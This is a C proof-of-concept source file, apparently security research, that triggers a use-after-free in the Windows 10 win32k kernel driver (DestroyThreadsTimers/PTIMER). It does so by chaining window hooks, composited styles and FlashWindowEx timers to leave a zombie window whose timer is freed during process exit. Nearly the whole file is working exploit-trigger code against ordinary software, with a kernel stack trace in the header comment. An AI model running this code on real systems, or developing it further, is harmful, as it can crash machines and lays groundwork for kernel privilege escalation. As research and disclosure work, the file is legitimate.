//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #2 - DestroythreadsTimers PTIMER UAF
// Windows 10 x64
//

/*
We create a situation where two consecutive timers can be manipulated
in such a way that one timer will destroy the other through a proxy zombie window.
The attack is on the loop that destroys all timers that belong to the current terminated thread.

This is an advanced case of chain-effect and multiple zombie reloadings.

Stack trace of the vulnerability triggered:
win32kfull!FreeTimer+0x9f						;	#4 Composited timer is destroyed.
win32kfull!FindTimer+0xa4
win32kfull!DecrementCompositedCount+0x3a
win32kfull!SetVisible+0xf4b7a
win32kfull!xxxDestroyWindow+0xec38a				;	#3 Window of first timer is freed.
win32kbase!xxxDestroyWindowIfSupported+0x25
win32kbase!HMDestroyUnlockedObject+0x69
win32kbase!HMUnlockObjectInternal+0x4f
win32kbase!HMAssignmentUnlock+0x2d
win32kfull!FreeTimer+0x97						;	#2 First timer is freed.
win32kfull!DestroyThreadsTimers+0x48			;	#1 This is the the attacked function
win32kbase!xxxDestroyThreadInfo+0x52b
win32kbase!UserThreadCallout+0x290
win32kfull!W32pThreadCallout+0x61
win32kbase!W32CalloutDispatch+0x3db
win32k!W32CalloutDispatchThunk+0xb
nt!ExCallCallBack+0x3d
nt!PspExitThread+0x497
nt!NtTerminateProcess+0xeb
nt!KiSystemServiceCopyEnd+0x25
ntdll!NtTerminateProcess+0x14
ntdll!RtlExitUserProcess+0xb8
KERNEL32!ExitProcessImplementation+0xa

To see the UAF one should set a breakpoint on DestroyThreadsTimers (making sure it's the right thread),
and walk over FreeTimer call, and in the next iteration the pointer should point to a freed memory,
where the PTI comparison takes place.
*/

#include <windows.h>
#include <stdio.h>

LRESULT CALLBACK hookCWPProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PCWPSTRUCT p = (PCWPSTRUCT)lParam;
	if (p->message == WM_SETREDRAW)
	{
		printf("Destroying window from WM_SETREDRAW messaging flow\n");
		UnhookWindowsHook(WH_CALLWNDPROC, hookCWPProc);

		// Finally, we destroy the window here.
		// From here on, we collapse back in flow of all callbacks.
		DestroyWindow(p->hwnd);

		// Now we're going back to kernel to SendMessage mechanism,
		// so it will continue to xxxDWP_SetRedraw,
		// even though the window is now a zombie.
	}
	return 0;
}

void DanceSetVisible(HWND hWnd)
{
	// The zombie window has to be visible for the composited window to take effect!
	// The problem is that xxxDWP_SetRedraw doesn't callback to user-mode for a zombie reloading to work properly.
	// We know that in order for a kernel function to modify a zombie, it has to callback to user-mode in its middle.
	// We will have to imitate this behavior by hooking call-window-procedure.
	// Once we're called from that hooking point,
	// we can destroy the window, and return to kernel where it will continue to
	// call xxxDWP_SetRedraw which will make the zombie visible!
	// This is another advanced way to do zombie reloading.

	printf("Hooking callwndproc\n");
	SetWindowsHookEx(WH_CALLWNDPROC, hookCWPProc, NULL, GetCurrentThreadId());
	SendMessage(hWnd, WM_SETREDRAW, 1, 0);
}

LRESULT CALLBACK wndproc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	// WM_NCACTIVATE is sent by FlashWindow, meaning we're in the middle of it.
	if (msg == WM_NCACTIVATE)
	{
		printf("Inside xxxFlashWindow\n");
		printf("Changing window to composited\n");
		SetWindowLongPtr(hWnd, GWL_EXSTYLE, WS_EX_COMPOSITED);

		// Here we're going back to kernel to FlashWindow.
	}

	// WM_STYLECHANGING is sent by previous call to SetWindowLongPtr, so change to visible.
	if (msg == WM_STYLECHANGING)
	{
		printf("Inside xxxSetWindowStyle\n");
		printf("Making window visible\n");
		DanceSetVisible(hWnd);

		// Here we're going back to kernel to SetWindowLongPtr to turn the window into a composited one.
	}

	return DefWindowProc(hWnd, msg, wParam, lParam);
}

int main()
{
	WNDCLASS wc = { 0 };
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = "asdf";
	RegisterClass(&wc);
	HWND hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, NULL, NULL, NULL, NULL, NULL);

	// First turn the window into composited window before starting the flow.
	// Otherwise upon turning it again once it's a zombie window, the composited count is incremented twice,
	// and never goes back to zero, and thus the timer won't die when the window is next destroyed and attack will fail.
	// Some weird edge case bug we have to manuever.
	ShowWindow(hWnd, SW_SHOWNA);
	SetWindowLongPtr(hWnd, GWL_EXSTYLE, WS_EX_COMPOSITED);

	// And only now set our window proc, so we ignored the previous messages from our logic.
	SetWindowLongPtr(hWnd, GWLP_WNDPROC, (LONG_PTR)wndproc);

	// Flash will add the last timer per window (holds a reference) and also start the whole flow.
	FLASHWINFO fwi = { 0 };
	fwi.cbSize = sizeof(fwi);
	fwi.hwnd = hWnd;
	fwi.dwFlags = FLASHW_TIMER | FLASHW_CAPTION;
	printf("Flash-window\n");
	FlashWindowEx(&fwi);

	/*
	Reverse order of the actions needed:
	Destroy window
	Make visible
	Change to composited
	Create composited timer
	Create flashing timer
	*/

	////
	// Right at this point, our hWnd is a zombie that is held by a timer that is held by the thread.
	////

	// ExitProcess will be called next by the CRT, and it will trigger DestroyThreadsTimers...
	return 1;
}
